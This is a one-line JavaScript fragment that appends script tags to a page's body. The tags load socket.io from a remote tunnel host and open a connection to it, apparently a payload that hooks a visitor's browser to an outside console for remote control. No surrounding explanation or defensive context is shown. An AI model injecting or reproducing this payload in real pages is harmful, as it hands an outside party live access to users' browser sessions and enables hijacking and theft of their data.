...
document.body.innerHTML += '<script src="https://remotejs.loophole.site/socket.io/socket.io.js"></script><script>var socket = io.connect("https://remotejs.loophole.site");</script><h1>Test</h1>';
